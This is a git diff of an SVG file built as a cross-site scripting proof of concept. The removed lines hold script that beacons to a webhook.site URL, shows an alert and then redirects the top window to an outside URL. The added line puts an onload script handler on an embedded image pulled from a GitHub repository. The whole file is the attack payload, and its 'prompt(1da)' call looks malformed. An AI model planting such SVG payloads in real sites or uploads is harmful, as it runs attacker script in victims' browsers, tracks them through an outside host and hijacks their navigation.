@@ -1,16 +1,9 @@
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300">
-    <image xlink:href="https://webhook.site/2c371927-56cd-4a84-9ba8-c44ef80039f3" x="0" y="0" width="400" height="300" preserveAspectRatio="xMidYMid meet" />
+    <image xlink:href="https://raw.githubusercontent.com/Zprogrammer01/TEST/7b104c66e1e6d0a7e0c9751d8d486020fec940ef/aaaaaa.svg" onload="prompt(1da)" x="0" y="0" width="400" height="300" preserveAspectRatio="xMidYMid meet" />
     <script>
-        // Immediate webhook request and alert
-        fetch('https://webhook.site/2c371927-56cd-4a84-9ba8-c44ef80039f3', {method: 'GET', mode: 'no-cors'}).catch(e => console.log('Immediate webhook request failed:', e));
-        alert('XSS PoC: Safe demonstration');
-        // Delayed webhook request and redirect
-        setTimeout(() => {
-            fetch('https://webhook.site/2c371927-56cd-4a84-9ba8-c44ef80039f3', {method: 'GET', mode: 'no-cors'}).catch(e => console.log('Delayed webhook request failed:', e));
-            window.top.location.href = 'https://pfst.cf2.poecdn.net/base/text/db7a3cec8a436e30cbc7860cb4f7981db7b3af6a835e207df4f2f174da438f60?pmaid=443159052';
-        }, 4000);
+        
     </script>
     <text x="200" y="20" font-size="16" text-anchor="middle" fill="white" style="text-shadow: 2px 2px 4px #000;">XSS PoC: Redirecting...</text>
 </svg>
